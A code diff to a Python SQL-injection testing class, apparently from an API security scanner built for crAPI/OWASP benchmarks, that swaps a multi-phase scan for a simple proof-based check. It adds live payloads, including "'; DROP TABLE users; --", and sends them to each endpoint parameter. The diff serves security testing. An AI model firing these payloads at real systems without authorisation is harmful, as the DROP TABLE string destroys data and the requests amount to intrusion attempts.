@@ -14,6 +14,7 @@ v1.0.0 Enhancements:
 - crAPI/OWASP benchmark coverage
 """
 
+import json
 import time
 import re
 from typing import Any, Optional
@@ -327,6 +328,12 @@ class SQLInjectionAttacker:
         "user_data",
         "credentials",
     ]
+
+    PROOF_PAYLOADS = [
+        "' OR '1'='1",
+        "'; DROP TABLE users; --",
+        "' OR 1=1 --",
+    ]
     
     def __init__(self, target_url: str, timeout: int = 10):
         """Initialize the SQL injection attacker.
@@ -346,6 +353,7 @@ class SQLInjectionAttacker:
         
         # Store baseline responses for comparison
         self.baseline_responses: dict[str, dict] = {}
+        self._last_request_error: Optional[str] = None
     
     def attack(
         self, 
@@ -364,55 +372,196 @@ class SQLInjectionAttacker:
             List of attack results
         """
         results: list[AttackResult] = []
-        
+
         # Handle API misuse (list passed as auth_token)
         if auth_token is not None and isinstance(auth_token, list):
             parameters_to_test = auth_token
             auth_token = None
-        
+
         if auth_token:
-            self.session.headers['Authorization'] = f"Bearer {auth_token}"
-        
-        # Determine which parameters to test
+            self.session.headers["Authorization"] = f"Bearer {auth_token}"
+
         params_to_test = self._get_testable_parameters(endpoint, parameters_to_test)
-        
         if not params_to_test:
             return results
-        
-        # Establish baseline for each parameter
-        self._establish_baselines(endpoint, params_to_test)
-        
-        # Test each parameter
+
         for param in params_to_test:
-            # Phase 1: Quick error-based tests
-            for payload in self.PAYLOADS["generic"][:5]:
-                result = self._test_payload(endpoint, param, payload, "error_based")
+            baseline_response = self._send_request(endpoint, param, "1")
+            if baseline_response is None or baseline_response.status_code != 200:
+                results.append(
+                    AttackResult(
+                        endpoint=endpoint,
+                        attack_type=AttackType.SQL_INJECTION,
+                        success=False,
+                        payload="error_case",
+                        request_url=f"{self.target_url}{endpoint.path}",
+                        request_method=endpoint.method.value,
+                        error_message=(
+                            self._last_request_error
+                            or "Baseline request failed"
+                        ),
+                        extra_data={"exception": True, "param_name": param.name},
+                    )
+                )
+                continue
+            self.baseline_responses[param.name] = {
+                "status": baseline_response.status_code if baseline_response else None,
+                "text": baseline_response.text.lower()[:500] if baseline_response else "",
+            }
+
+            for payload in self.PROOF_PAYLOADS:
+                attack_response = self._send_request(endpoint, param, payload)
+                result = self._build_proof_result(
+                    endpoint,
+                    param,
+                    payload,
+                    baseline_response,
+                    attack_response,
+                )
                 results.append(result)
-                
-                if result.success:
-                    # Found vulnerability, do deeper testing
-                    for db_type in ["mysql", "postgresql", "mssql", "sqlite"]:
-                        for db_payload in self.PAYLOADS.get(db_type, [])[:3]:
-                            results.append(self._test_payload(endpoint, param, db_payload, db_type))
-                    break
-            
-            # Phase 2: Time-based blind tests (important for blind SQLi)
-            for payload in self.PAYLOADS["time_based"][:4]:
-                result = self._test_time_based(endpoint, param, payload)
-                results.append(result)
-                
+
                 if result.success:
                     break
-            
-            # Phase 3: Boolean-based blind tests
-            bool_results = self._test_boolean_based(endpoint, param)
-            results.extend(bool_results)
-            
-            # Phase 4: UNION-based tests (column counting)
-            union_results = self._test_union_based(endpoint, param)
-            results.extend(union_results)
-        
+
         return results
+
+    def _responses_equivalent(self, a: str, b: str) -> bool:
+        """Compare two response bodies semantically when possible."""
+        try:
+            return json.loads(a) == json.loads(b)
+        except Exception:
+            return a.strip() == b.strip()
+
+    def _extract_evidence_excerpt(self, response_text: str) -> str:
+        """Extract a short response snippet suitable for proof."""
+        return response_text[:200]
+
+    def _send_request(
+        self,
+        endpoint: Endpoint,
+        param: Parameter,
+        value: Any,
+    ) -> Optional[requests.Response]:
+        """Send a baseline or attack request for a single parameter."""
+        self._last_request_error = None
+        try:
+            url = f"{self.target_url}{endpoint.path}"
+            params: dict[str, Any] = {}
+            json_body: dict[str, Any] = {}
+            headers: dict[str, str] = {}
+
+            for p in endpoint.parameters:
+                if p.name == param.name:
+                    continue
+                default = self._get_default_value(p)
+                if p.location == "query":
+                    params[p.name] = default
+                elif p.location == "body":
+                    json_body[p.name] = default
+                elif p.location == "header":
+                    headers[p.name] = str(default)
+
+            if param.location == "query":
+                params[param.name] = value
+            elif param.location == "body":
+                json_body[param.name] = value
+            elif param.location == "path":
+                from urllib.parse import quote
+                url = url.replace(f"{{{param.name}}}", quote(str(value), safe=""))
+
+            if endpoint.method.value == "GET":
+                return self.session.get(
+                    url,
+                    params=params or None,
+                    headers=headers or None,
+                    timeout=self.timeout,
+                )
+
+            return self.session.request(
+                endpoint.method.value,
+                url,
+                params=params or None,
+                json=json_body or None,
+                headers=headers or None,
+                timeout=self.timeout,
+            )
+        except requests.exceptions.Timeout as exc:
+            self._last_request_error = str(exc) or "Request timed out"
+            return None
+        except requests.exceptions.ConnectionError as exc:
+            self._last_request_error = str(exc) or "Connection error"
+            return None
+        except Exception as exc:
+            self._last_request_error = str(exc) or "Request failed"
+            return None
+
+    def _build_proof_result(
+        self,
+        endpoint: Endpoint,
+        param: Parameter,
+        payload: str,
+        baseline_response: Optional[requests.Response],
+        attack_response: Optional[requests.Response],
+    ) -> AttackResult:
+        """Build a proof-based SQL injection result from baseline and attack responses."""
+        if attack_response is None:
+            return AttackResult(
+                endpoint=endpoint,
+                attack_type=AttackType.SQL_INJECTION,
+                success=False,
+                payload="error_case",
+                request_url=f"{self.target_url}{endpoint.path}",
+                request_method=endpoint.method.value,
+                error_message=self._last_request_error or "Attack request failed",
+                extra_data={"exception": True, "param_name": param.name},
+            )
+
+        success = (
+            attack_response is not None
+            and attack_response.status_code in [200, 500]
+            and baseline_response is not None
+            and baseline_response.status_code == 200
+            and not self._responses_equivalent(
+                baseline_response.text,
+                attack_response.text,
+            )
+            and len(attack_response.text) != len(baseline_response.text)
+            and (
+                attack_response.status_code == 500
+                or "sql" in attack_response.text.lower()
+                or "syntax" in attack_response.text.lower()
+            )
+        )
+
+        evidence_excerpt = None
+        evidence = ""
+        if success:
+            evidence_excerpt = self._extract_evidence_excerpt(attack_response.text)
+            if attack_response.status_code == 500:
+                evidence = "Server error response changed after SQL-like payload"
+            else:
+                evidence = "Response changed after SQL-like payload"
+
+        request_url = getattr(getattr(attack_response, "request", None), "url", None)
+        if request_url is None:
+            request_url = f"{self.target_url}{endpoint.path}"
+
+        return AttackResult(
+            endpoint=endpoint,
+            attack_type=AttackType.SQL_INJECTION,
+            success=success,
+            payload=f"injection: {payload}",
+            request_url=request_url,
+            request_method=endpoint.method.value,
+            response_status=attack_response.status_code,
+            response_body=attack_response.text[:500],
+            evidence_excerpt=evidence_excerpt,
+            extra_data={
+                "technique": "proof_based_injection",
+                "evidence": evidence,
+                "param_name": param.name,
+            } if success else None,
+        )
     
     def _get_testable_parameters(
         self, 
